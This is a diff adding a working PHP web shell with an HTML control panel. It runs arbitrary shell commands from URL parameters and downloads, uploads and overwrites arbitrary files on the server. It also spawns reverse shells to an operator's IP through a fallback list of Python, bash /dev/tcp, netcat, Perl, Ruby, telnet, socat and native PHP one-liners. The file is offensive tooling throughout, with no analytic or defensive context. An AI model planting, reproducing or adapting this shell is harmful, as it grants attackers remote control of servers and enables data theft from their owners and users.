@@ -1,0 +1,101 @@
+<?php
+@error_reporting(0);
+@set_time_limit(0);
+@ini_set('max_execution_time', 0);
+
+if(isset($_GET['c'])) {
+    echo "<pre>" . shell_exec($_GET['c'] . " 2>&1") . "</pre>";
+    die();
+}
+
+if(isset($_GET['r'])) {
+    list($ip, $port) = explode(':', $_GET['r']);
+    $m = isset($_GET['m']) ? $_GET['m'] : 'auto';
+    
+    // Find bash path
+    $bash = '/bin/bash';
+    foreach(['/bin/bash','/usr/bin/bash','/usr/local/bin/bash'] as $b) {
+        if(file_exists($b)) { $bash = $b; break; }
+    }
+    
+    $methods = array(
+        'python' => "/usr/bin/python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"$ip\",$port));[os.dup2(s.fileno(),f)for f in(0,1,2)];subprocess.call([\"$bash\",\"-i\"])'",
+        'python2' => "/usr/bin/python -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"$ip\",$port));[os.dup2(s.fileno(),f)for f in(0,1,2)];subprocess.call([\"$bash\",\"-i\"])'",
+        'bash' => "$bash -c '$bash -i >& /dev/tcp/$ip/$port 0>&1'",
+        'sh' => "/bin/sh -c '/bin/sh -i >& /dev/tcp/$ip/$port 0>&1'",
+        'nc' => "/bin/nc $ip $port -e $bash",
+        'nc_alt' => "/bin/nc -e $bash $ip $port",
+        'ncat' => "/usr/bin/ncat $ip $port -e $bash",
+        'perl' => "/usr/bin/perl -e 'use Socket;\$i=\"$ip\";\$p=$port;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));connect(S,sockaddr_in(\$p,inet_aton(\$i)));open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"$bash -i\");'",
+        'ruby' => "/usr/bin/ruby -rsocket -e 'exit if fork;c=TCPSocket.new(\"$ip\",$port);loop{c.gets.chomp!;(exit! if $_==\"exit\");(\$_=~/cd (.+)/i?(Dir.chdir(\$1)):(IO.popen(\$_,?r){|io|c.print io.read}))rescue c.puts \"failed: #{\$_}\"}'",
+        'telnet' => "(telnet $ip $port||while :;do sh&&break;done)2>&1|telnet $ip $((port+1))>/dev/null 2>&1&",
+        'socat' => "/usr/bin/socat exec:'$bash -li',pty,stderr,setsid,sigint,sane tcp:$ip:$port",
+        'php' => 'native_php'
+    );
+    
+    if($m == 'auto') {
+        // Try each method until one works
+        foreach($methods as $name => $cmd) {
+            if($name == 'native_php') {
+                $s = @fsockopen($ip, $port);
+                if($s) {
+                    @proc_open($bash . ' -i', array(0=>$s,1=>$s,2=>$s), $p);
+                    die();
+                }
+            } else {
+                @shell_exec($cmd . ' 2>/dev/null &');
+                usleep(100000); // 0.1s delay
+            }
+        }
+    } else {
+        // Use specific method
+        if($methods[$m] == 'native_php') {
+            $s = fsockopen($ip, $port);
+            proc_open($bash . ' -i', array(0=>$s,1=>$s,2=>$s), $p);
+        } else {
+            shell_exec($methods[$m]);
+        }
+    }
+    die();
+}
+
+if(isset($_GET['d'])) {
+    header('Content-Type: application/octet-stream');
+    header('Content-Disposition: attachment; filename="'.basename($_GET['d']).'"');
+    readfile($_GET['d']);
+    die();
+}
+
+if(isset($_GET['u']) && isset($_FILES['f'])) {
+    $dest = isset($_GET['path']) ? $_GET['path'] : $_FILES['f']['name'];
+    move_uploaded_file($_FILES['f']['tmp_name'], $dest);
+    echo "Uploaded to: $dest";
+    die();
+}
+
+if(isset($_GET['w'])) {
+    // Write file: ?w=/path/file&data=content
+    file_put_contents($_GET['w'], $_GET['data']);
+    echo "Written to: " . $_GET['w'];
+    die();
+}
+?>
+<!DOCTYPE html>
+<html><body>
+<h3>Shell</h3>
+<form method=post enctype=multipart/form-data>
+File: <input type=file name=f> Path: <input name=path placeholder="optional">
+<input type=hidden name=u value=1><input type=submit value=Upload>
+</form>
+<form method=get>
+CMD: <input name=c size=60 autofocus><input type=submit value=Exec>
+</form>
+<hr>
+<b>Rev Shell:</b> 
+<a href=?r=IP:443&m=auto>AUTO</a> | 
+<a href=?r=IP:443&m=python>Py3</a> | 
+<a href=?r=IP:443&m=bash>Bash</a> | 
+<a href=?r=IP:443&m=nc>NC</a> | 
+<a href=?r=IP:443&m=perl>Perl</a> | 
+<a href=?r=IP:443&m=php>PHP</a>
+</body></html>
